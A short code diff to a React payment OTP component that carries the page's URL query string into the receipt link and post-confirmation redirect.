@@ -22,6 +22,7 @@ const PaymentOTP = () => {
   const shareId = rawIdParam || "";
   const { data: payment, refetch } = usePayment(paymentId);
   const { data: link } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
   const updatePayment = useUpdatePayment();
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
@@ -148,7 +149,7 @@ const PaymentOTP = () => {
         paymentId: payment.id,
         updates: {
           status: "confirmed",
-          receipt_url: `/pay/${shareId}/receipt/${payment.id}`,
+          receipt_url: `/pay/${shareId}/receipt/${payment.id}${currentSearch}`,
         },
       });
       
@@ -157,7 +158,7 @@ const PaymentOTP = () => {
         description: "تم تأكيد الدفع بنجاح",
       });
       
-      navigate(`/pay/${shareId}/receipt/${payment.id}`);
+      navigate(`/pay/${shareId}/receipt/${payment.id}${currentSearch}`);
     } else {
       // Wrong OTP
       const newAttempts = payment.attempts + 1;
